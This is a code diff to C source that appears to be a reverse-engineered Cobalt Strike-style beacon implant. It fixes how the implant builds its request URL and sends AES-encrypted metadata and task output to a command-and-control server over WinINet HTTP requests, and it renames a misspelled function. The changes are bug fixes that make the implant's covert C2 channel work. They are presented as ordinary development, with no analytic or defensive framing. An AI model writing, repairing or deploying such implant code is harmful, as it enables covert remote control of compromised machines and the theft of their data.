@@ -1,5 +1,6 @@
 #pragma once
 #define LTM_DESC
+
 #pragma warning(disable:4996) 
 #include <sphelper.h>
 #pragma warning(default: 4996)
@@ -7,7 +8,7 @@
 #include <windows.h>
 #include "data_deal.h"
 #include "http_tool.h"
-
+#include "ida.h"
 
 int Beacon_kill_data()
 {
@@ -327,7 +328,7 @@ int aes_cbc_encrypt(int a1, char* in)
 
 
 
-BOOL sned_generate_Metadata()
+BOOL send_generate_Metadata()
 {
 	HANDLE result;
 	int v1;
@@ -337,7 +338,7 @@ BOOL sned_generate_Metadata()
 	void* v5;
 	DWORD v6;
 	size_t v7;
-	CHAR szObjectName;
+	CHAR* szObjectName;
 	char v9[1023];
 	char enc_Metadata[128];
 	LPCSTR lpszAcceptTypes[2];
@@ -346,7 +347,7 @@ BOOL sned_generate_Metadata()
 	// 构造元数据发送元数据
 	lpszAcceptTypes[0] = "*/*";
 	lpszAcceptTypes[1] = 0;
-	szObjectName = 0;
+	szObjectName = (char *)malloc(0x400);
 	memset(v9, 0, sizeof(v9));
 	enc_Metadata[0] = 0;
 	memset(&enc_Metadata[1], 0, 0x7Fu);
@@ -363,16 +364,16 @@ BOOL sned_generate_Metadata()
 	http_post_client_1024 = get_str(13);          // .http-post.client
 	encode_Metadata(http_post_client_1024, &lpszHeaders, enc_Metadata, v1, v5, v7);
 	if ((char*)lpszHeaders.field_1 + strlen((const char*)lpszHeaders.field_1) + 1 == (char*)lpszHeaders.field_1 + 1)
-		_snprintf(&szObjectName, 0x400u, "%s", (const char*)lpszHeaders.http_get_url);
+		_snprintf(szObjectName, 0x400u, "%s", (const char*)lpszHeaders.http_get_url);
 	else
-		_snprintf(&szObjectName, 0x400u, "%s%s", (const char*)lpszHeaders.http_get_url, (const char*)lpszHeaders.field_1);
+		_snprintf(szObjectName, 0x400u, "%s%s", (const char*)lpszHeaders.http_get_url, (const char*)lpszHeaders.field_1);
 	Close_token_fake();
 	v13 = 0;
 	while (1)
 	{
 		v6 = dwFlags;
 		v3 = get_str(27);
-		hRequest = HttpOpenRequestA(hConnect, v3, &szObjectName, 0, 0, lpszAcceptTypes, v6, (DWORD_PTR)&dwContext);
+		hRequest = HttpOpenRequestA(hConnect, v3, szObjectName, 0, 0, lpszAcceptTypes, v6, (DWORD_PTR)&dwContext);
 		set_http_opt(hRequest);
 		HttpSendRequestA(
 			hRequest,
@@ -391,6 +392,7 @@ BOOL sned_generate_Metadata()
 LABEL_10:
 	free_struc2_in_struc1(&lpszHeaders);                   // 释放struc_1
 	Globala6 = 0;
+	free(szObjectName);
 	return restore_token_fake();
 }
 
@@ -412,18 +414,18 @@ DWORD sub_10002340(u_long out_encrypt_data_len, void* encrypt_data, int a3)
 	}
 	if (Globala6 + out_encrypt_data_len + 4 > 0x200000)
 	{
-		sned_generate_Metadata();
+		send_generate_Metadata();
 	}
 	v4 = htonl(out_encrypt_data_len);
 	v5 = Globa_unknown_data;
 	v6 = Globala6;
-	*&Globa_unknown_data[Globala6] = v4;
+	*(int *)&Globa_unknown_data[Globala6] = v4;
 	v6 += 4;
 	memcpy(&v5[v6], encrypt_data, out_encrypt_data_len);
 	Globala6 = out_encrypt_data_len + v6;
 	if (a3)
 	{
-		result = sned_generate_Metadata();
+		result = send_generate_Metadata();
 	}
 	return result;
 }
@@ -457,6 +459,8 @@ void* aes_encrypt_ret_data(void* data, size_t data_Size, u_long ret_Task_id, int
 	*out_encrypt_data_len = aes_cbc_encrypt(v7, (char*)buff);//aes加密
 	return buff;
 }
+
+
 
 void sub_10001287(void* data, size_t data_Size, u_long ret_Task_id, int a4)
 {
